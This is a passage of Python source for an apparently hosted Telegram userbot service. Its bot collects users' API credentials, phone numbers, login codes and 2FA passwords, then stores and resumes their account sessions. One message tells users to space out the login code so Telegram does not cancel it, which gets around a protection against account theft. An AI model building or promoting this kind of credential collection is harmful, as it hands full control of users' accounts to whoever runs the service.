                except Exception:
                    pass

async def start_userbot_session(user_key: int, api_id: int, api_hash: str, session_string: str, phone: str = ""):
    if user_key in ACTIVE_CLIENTS:
        try:
            if ACTIVE_CLIENTS[user_key].is_connected():
                return ACTIVE_CLIENTS[user_key]
        except Exception:
            pass

    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    await client.connect()
    if not await client.is_user_authorized():
        raise ValueError(f"Session for {phone or user_key} is not authorized.")

    me = await client.get_me()
    register_userbot_handlers(client, user_key)
    ACTIVE_CLIENTS[user_key] = client
    CLIENT_INFO[user_key] = {
        "id": me.id,
        "first_name": me.first_name,
        "username": me.username,
        "phone": me.phone or phone
    }
    logger.info(f"✨ Userbot client successfully started for: {me.first_name} (@{me.username})")
    return client

async def stop_userbot_session(user_key: int):
    client = ACTIVE_CLIENTS.pop(user_key, None)
    CLIENT_INFO.pop(user_key, None)
    if client:
        try:
            await client.disconnect()
            logger.info(f"Disconnected userbot for user {user_key}.")
        except Exception as exc:
            logger.error(f"Error disconnecting userbot {user_key}: {exc}")

# =====================================================================
# 4. LIGHTWEIGHT HTTP HEALTH SERVER FOR RENDER
# =====================================================================
async def handle_render_http(reader, writer):
    try:
        await reader.read(1024)
        active_count = len(ACTIVE_CLIENTS)
        body = (
            f"<html><head><title>TeleGuard Service</title></head>"
            f"<body style='font-family:sans-serif;background:#0d1117;color:#58a6ff;padding:40px;'>"
            f"<h2>🛡️ TeleGuard Userbot Suite is Live</h2>"
            f"<p>Status: Healthy (200 OK)</p>"
            f"<p>Active Userbots: {active_count}</p>"
            f"<p>Mandatory Channel: <a href='{REQUIRED_CHANNEL_URL}' style='color:#79c0ff;'>{REQUIRED_CHANNEL_USERNAME}</a></p>"
            f"</body></html>"
        )
        response = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n\r\n"
            + body
        )
        writer.write(response.encode("utf-8"))
        await writer.drain()
    except Exception:
        pass
    finally:
        writer.close()

async def start_render_health_server():
    port = int(os.environ.get("PORT", "10000"))
    server = await asyncio.start_server(handle_render_http, "0.0.0.0", port)
    logger.info(f"🌐 Render Health Web Server listening on port {port}")
    return server

# =====================================================================
# 5. TELEGRAM ONBOARDING BOT (Multi-User Login + Channel Verification)
# =====================================================================
bot = TelegramClient(StringSession(), BOT_API_ID, BOT_API_HASH)

async def check_channel_membership(user_id: int) -> bool:
    try:
        participant = await bot(GetParticipantRequest(
            channel=REQUIRED_CHANNEL_USERNAME,
            participant=user_id
        ))
        return bool(participant)
    except errors.UserNotParticipantError:
        return False
    except Exception as exc:
        logger.warning(f"Channel membership lookup error for {user_id}: {exc}")
        return False

def get_join_keyboard():
    return [
        [Button.url("📢 Join Required Channel", REQUIRED_CHANNEL_URL)],
        [Button.inline("✅ I Have Joined (Verify)", data=b"verify_channel")]
    ]

@bot.on(events.NewMessage(pattern=r"^/start"))
async def handle_start(event):
    uid = event.sender_id
    user = await event.get_sender()
    is_joined = await check_channel_membership(uid)

    if not is_joined:
        await event.reply(
            f"👋 Hello {user.first_name}!\n\n"
            f"⚠️ **Access Restricted:** You must join our official channel to use the **TeleGuard Userbot**.\n\n"
            f"👉 Channel: {REQUIRED_CHANNEL_URL}\n\n"
            f"After joining, click the verification button below.",
            buttons=get_join_keyboard()
        )
        return

    sess = get_user_session(uid)
    if sess:
        await event.reply(
            f"🛡️ **Welcome back, {user.first_name}!**\n\n"
            f"Your userbot is currently **ACTIVE** on phone: `{sess['phone']}`.\n\n"
            f"Use `/status` to view engine state or `/logout` to disconnect."
        )
    else:
        await event.reply(
            f"🛡️ **Welcome to TeleGuard Multi-Userbot Suite!**\n\n"
            f"Anyone can connect and run their personal userbot safely with **AES-256 encrypted storage**.\n\n"
            f"👉 Click `/login` to connect your account using your API ID, API Hash, and Phone Number.",
            buttons=[[Button.inline("🚀 Start Login Wizard", data=b"start_login")]]
        )

@bot.on(events.CallbackQuery(data=b"verify_channel"))
async def handle_channel_verification_button(event):
    uid = event.sender_id
    user = await event.get_sender()
    is_joined = await check_channel_membership(uid)

    if not is_joined:
        await event.answer("❌ You haven't joined the channel yet! Please join and retry.", alert=True)
        return

    await event.answer("✅ Verification successful!", alert=False)
    sess = get_user_session(uid)
    if sess:
        await event.edit(
            f"✅ **Channel Verified!**\n\n"
            f"Welcome back, {user.first_name}! Your userbot is **ACTIVE** on `{sess['phone']}`."
        )
    else:
        await event.edit(
            f"✅ **Channel Verified!**\n\n"
            f"You can now connect your personal userbot.\n\n"
            f"Click `/login` to start onboarding.",
            buttons=[[Button.inline("🚀 Start Login Wizard", data=b"start_login")]]
        )

@bot.on(events.NewMessage(pattern=r"^/status"))
async def handle_status_command(event):
    uid = event.sender_id
    sess = get_user_session(uid)
    active = uid in ACTIVE_CLIENTS
    total = len(ACTIVE_CLIENTS)

    await event.reply(
        f"📊 **TeleGuard Server Status**\n\n"
        f"• Your Session: `{'🟢 CONNECTED' if active else '🔴 INACTIVE'}`\n"
        f"• Stored Phone: `{sess['phone'] if sess else 'Not logged in'}`\n"
        f"• Total Concurrent Users: `{total}`\n"
        f"• Encryption: `AES-256-GCM`\n"
        f"• Channel: `{REQUIRED_CHANNEL_URL}`"
    )

@bot.on(events.NewMessage(pattern=r"^/logout"))
async def handle_logout(event):
    uid = event.sender_id
    await stop_userbot_session(uid)
    delete_user_session(uid)
    await event.reply("✅ Your userbot session has been deleted and disconnected cleanly.")

@bot.on(events.CallbackQuery(data=b"start_login"))
async def cb_start_login(event):
    uid = event.sender_id
    is_joined = await check_channel_membership(uid)
    if not is_joined:
        await event.answer("Please join the channel first!", alert=True)
        return
    LOGIN_STATES[uid] = {"step": "API_ID"}
    await event.edit(
        "📱 **Step 1/5: Enter your Telegram API ID**\n\n"
        "Obtain it from [my.telegram.org](https://my.telegram.org).\n"
        "Send your numeric API ID below (or `/cancel` to abort):"
    )

@bot.on(events.NewMessage(pattern=r"^/login"))
async def handle_login_cmd(event):
    uid = event.sender_id
    is_joined = await check_channel_membership(uid)
    if not is_joined:
        await event.reply(
            f"⚠️ You must join our channel first: {REQUIRED_CHANNEL_URL}",
            buttons=get_join_keyboard()
        )
        return
    LOGIN_STATES[uid] = {"step": "API_ID"}
    await event.reply(
        "📱 **Step 1/5: Enter your Telegram API ID**\n\n"
        "Obtain it from [my.telegram.org](https://my.telegram.org).\n"
        "Send your numeric API ID below (or `/cancel` to abort):"
    )

@bot.on(events.NewMessage(pattern=r"^/cancel"))
async def handle_cancel(event):
    uid = event.sender_id
    state = LOGIN_STATES.pop(uid, None)
    if state and "client" in state:
        try:
            await state["client"].disconnect()
        except Exception:
            pass
    await event.reply("❌ Login wizard cancelled.")

@bot.on(events.NewMessage)
async def handle_wizard_steps(event):
    uid = event.sender_id
    text = (event.raw_text or "").strip()
    if text.startswith("/") or uid not in LOGIN_STATES:
        return

    state = LOGIN_STATES[uid]
    step = state.get("step")

    if step == "API_ID":
        if not text.isdigit():
            await event.reply("❌ Invalid API ID. Must be numeric. Please try again:")
            return
        state["api_id"] = int(text)
        state["step"] = "API_HASH"
        await event.reply(
            "🔑 **Step 2/5: Enter your Telegram API HASH**\n\n"
            "Send your 32-character API Hash string:"
        )

    elif step == "API_HASH":
        if len(text) < 16:
            await event.reply("❌ Invalid API Hash length. Please check and send again:")
            return
        state["api_hash"] = text
        state["step"] = "PHONE"
        await event.reply(
            "📞 **Step 3/5: Enter your Phone Number**\n\n"
            "Include your international country code (e.g. `+1234567890` or `+919876543210`):"
        )

    elif step == "PHONE":
        clean_phone = re.sub(r"[\s\-]", "", text)
        if not clean_phone.startswith("+") or len(clean_phone) < 8:
            await event.reply("❌ Please include country code starting with `+` (e.g. `+14155552671`):")
            return
        state["phone"] = clean_phone
        wait_msg = await event.reply("⏳ Connecting to Telegram MTProto and requesting login code...")

        try:
            client = TelegramClient(StringSession(), state["api_id"], state["api_hash"])
            await client.connect()
            send_code_result = await client.send_code_request(state["phone"])
            state["client"] = client
            state["phone_code_hash"] = send_code_result.phone_code_hash
            state["step"] = "CODE"
            await wait_msg.edit(
                "📩 **Step 4/5: Verification Code Sent!**\n\n"
                f"Check your Telegram app on `{state['phone']}`.\n\n"
                "⚠️ **Tip:** If the code is `12345`, send it as `1 2 3 4 5` with spaces so Telegram does not auto-cancel it."
            )
        except Exception as exc:
            logger.error(f"Failed to send code for {state['phone']}: {exc}")
            log_unauthorized_attempt(uid, getattr(event.sender, "username", "Unknown"), state["phone"], "send_code", str(exc))
            await wait_msg.edit(f"❌ Failed to send code: `{exc}`\n\nPlease check your API credentials and phone number.")
            LOGIN_STATES.pop(uid, None)

    elif step == "CODE":
        code = text.replace(" ", "").replace("-", "").strip()
        client: TelegramClient = state.get("client")
        wait_msg = await event.reply("⏳ Verifying login code...")

        try:
            await client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"])
            await finalize_onboarding(uid, state, client, wait_msg)
        except errors.SessionPasswordNeededError:
            state["step"] = "2FA"
            await wait_msg.edit(
                "🔐 **Step 5/5: Two-Step Verification (2FA) is ON**\n\n"
                "Please enter your Telegram Cloud 2FA Password below:"
            )
        except Exception as exc:
            logger.error(f"Sign-in error: {exc}")
            log_unauthorized_attempt(uid, getattr(event.sender, "username", "Unknown"), state["phone"], "sign_in", str(exc))
            await wait_msg.edit(f"❌ Verification failed: `{exc}`\n\nTry sending the code again or `/cancel` to restart.")

    elif step == "2FA":
        client: TelegramClient = state.get("client")
        password = text
        wait_msg = await event.reply("⏳ Verifying 2FA password...")

        try:
            await client.sign_in(password=password)
            await finalize_onboarding(uid, state, client, wait_msg)
        except Exception as exc:
            logger.error(f"2FA error: {exc}")
            log_unauthorized_attempt(uid, getattr(event.sender, "username", "Unknown"), state["phone"], "2fa_password", str(exc))
            await wait_msg.edit(f"❌ 2FA verification failed: `{exc}`\n\nPlease check your password and re-enter:")

async def finalize_onboarding(uid: int, state: dict, client: TelegramClient, status_msg):
    try:
        session_str = client.session.save()
        me = await client.get_me()

        save_user_session(
            user_id=uid,
            phone=state["phone"],
            api_id=state["api_id"],
            api_hash=state["api_hash"],
            session_str=session_str,
            first_name=me.first_name or "",
            username=me.username or ""
        )

        register_userbot_handlers(client, uid)
        ACTIVE_CLIENTS[uid] = client
        CLIENT_INFO[uid] = {
            "id": me.id,
            "first_name": me.first_name,
            "username": me.username,
            "phone": state["phone"]
        }
        LOGIN_STATES.pop(uid, None)

        success_msg = (
            f"🎉 **Userbot Successfully Connected!**\n\n"
            f"👤 **Account:** {me.first_name} (`@{me.username or 'NoUsername'}`)\n"
            f"📱 **Phone:** `{state['phone']}`\n"
            f"🔐 **Storage:** Encrypted with AES-256-GCM\n\n"
            f"🚀 **Quick Controls:**\n"
            f"• `*status` ➔ Real-time feature monitor\n"
            f"• `*nc` ➔ Start 5-title changer loop\n"
            f"• `*stopnc` ➔ Stop title loop\n"
            f"• `*pin` ➔ Auto-pin own messages in chat\n"
            f"• `*replyall` ➔ Group auto-reply rotation\n"
            f"• `*clearcache` ➔ Purge temporary files\n"
            f"• `*stopall` ➔ Emergency kill-switch in chat\n\n"
            f"Channel: {REQUIRED_CHANNEL_URL}"
        )
        await status_msg.edit(success_msg)
        logger.info(f"✅ Userbot onboarding completed for user {uid} ({state['phone']})")
    except Exception as exc:
        logger.error(f"Error finalizing onboarding for {uid}: {exc}")
        await status_msg.edit(f"❌ Failed to activate userbot: {exc}")

# =====================================================================
# 6. SYSTEM STARTUP & RESUMPTION ON RENDER
# =====================================================================
async def main():
    global STOP_EVENT, RENDER_SERVER
    STOP_EVENT = asyncio.Event()

    print("\n" + "="*70)
    print("  🛡️ TELEGUARD - ALL-IN-ONE TELEGRAM USERBOT & CLOUD SUITE")
    print(f"  Mandatory Channel Check: {REQUIRED_CHANNEL_URL}")
    print("  AES-256 Session Database • Render Cloud Ready • Open User Access")
    print("="*70)

    init_db()
    RENDER_SERVER = await start_render_health_server()

    logger.info(f"Connecting Telegram Bot (Token: {BOT_TOKEN[:10]}...)...")
    await bot.start(bot_token=BOT_TOKEN)
    bot_me = await bot.get_me()
    logger.info(f"🤖 Bot connected as: @{bot_me.username} [ID: {bot_me.id}]")

    active_sessions = get_all_active_sessions()
    logger.info(f"Found {len(active_sessions)} active encrypted userbot sessions in database.")
    for s in active_sessions:
        try:
            logger.info(f"Resuming userbot for {s['phone']} (User {s['user_id']})...")
            await start_userbot_session(
                user_key=s["user_id"],
                api_id=s["api_id"],
                api_hash=s["api_hash"],
                session_string=s["session_string"],
                phone=s["phone"]
            )
            await asyncio.sleep(0.5)
        except Exception as exc:
            logger.error(f"Failed to resume session for {s['phone']}: {exc}")

    print("\n" + "="*70)
    print("  🚀 TELEGUARD ENGINE IS RUNNING LIVE")
    print(f"  🤖 Bot: @{bot_me.username}")
    print(f"  📢 Verified Channel: {REQUIRED_CHANNEL_URL}")
    print(f"  🌐 Render Web Health Server: Port {os.environ.get('PORT', '10000')}")
    print(f"  🔐 Database: AES-256-GCM Encrypted Storage Active")
    print(f"  🚨 Intrusion Logger: Active (Tracking all unauthorized attempts)")
    print("="*70 + "\n")

    await STOP_EVENT.wait()

if __name__ == "__main__":
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        def shutdown_handler():
            logger.info("Termination signal received. Shutting down gracefully...")
            if STOP_EVENT and not STOP_EVENT.is_set():
                STOP_EVENT.set()

        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, shutdown_handler)
            except (NotImplementedError, AttributeError):
                pass

        loop.run_until_complete(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Exiting...")
        if bot and bot.is_connected():
            loop.run_until_complete(bot.disconnect())
        for ukey, cl in list(ACTIVE_CLIENTS.items()):
            try:
                if cl.is_connected():
                    loop.run_until_complete(cl.disconnect())
            except Exception:
                pass
        if RENDER_SERVER:
            try:
                RENDER_SERVER.close()
                loop.run_until_complete(RENDER_SERVER.wait_closed())
            except Exception:
                pass
        print("Clean shutdown complete.")
